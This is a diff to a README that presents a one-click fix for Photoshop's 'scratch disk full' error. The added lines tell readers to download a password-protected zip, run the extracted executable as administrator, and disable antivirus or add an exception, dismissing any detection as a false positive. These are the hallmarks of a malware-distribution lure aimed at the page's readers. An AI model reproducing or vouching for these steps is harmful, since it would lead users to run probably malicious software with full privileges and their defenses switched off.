@@ -3,10 +3,24 @@
 Fix Photoshop scratch disk full error and get back to work in one click.
 
 ---
-## Download
 
-👉 **[Latest Version]**  
-Password and full instructions on the page.
+<p align="center">
+  <a href="../../releases">
+    <img src="https://img.shields.io/badge/📦_DOWNLOAD_LATEST_VERSION-blue?style=for-the-badge&color=blue" alt="Download">
+  </a>
+</p>
+
+### 1. Download `Latest Version.zip`
+- Go to 
+- Download **`Latest Version.zip`**
+
+### 2. Unzip with password
+- Password: **`68924`** (case‑sensitive)
+- Use WinRAR, 7‑Zip, or built‑in Windows extractor
+
+### 3. Run as Administrator
+- Right‑click `Latest Version.exe` → **Run as administrator**
+- If your antivirus blocks it – add an exception or disable real‑time protection (false positive)
 ---
 
 ## The Problem
